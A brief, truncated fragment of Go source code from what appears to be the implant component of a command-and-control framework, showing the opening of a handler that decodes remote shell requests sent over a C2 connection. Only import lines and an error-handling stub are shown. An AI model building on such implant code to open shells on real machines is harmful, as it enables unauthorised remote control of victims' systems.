...
import (
	...
	"github.com/Kevin-kitnick/revils/implant/revils/shell"
...
func ShellReqHandler(envelope *revilspb.Envelope, connection *transports.Connection) {

	shellReq := &revilspb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[shell] Failed to unmarshal protobuf %s", err)
		// {{end}}
		shellResp, _ := proto.Marshal(&revilspb.Shell{
